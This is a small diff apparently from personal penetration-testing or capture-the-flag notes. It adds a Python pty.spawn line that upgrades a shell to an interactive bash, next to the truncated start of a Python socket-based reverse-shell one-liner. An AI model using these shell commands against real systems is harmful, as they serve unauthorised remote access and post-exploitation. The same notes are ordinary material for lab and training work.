@@ -5,3 +5,4 @@ python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STRE
 
 which python3
 python3 -c ‘import pty; pty.spawn(“/bin/bash”)’ - to see the path/directory
+python -c ‘import pty; pty.spawn(“/bin/bash”)’                
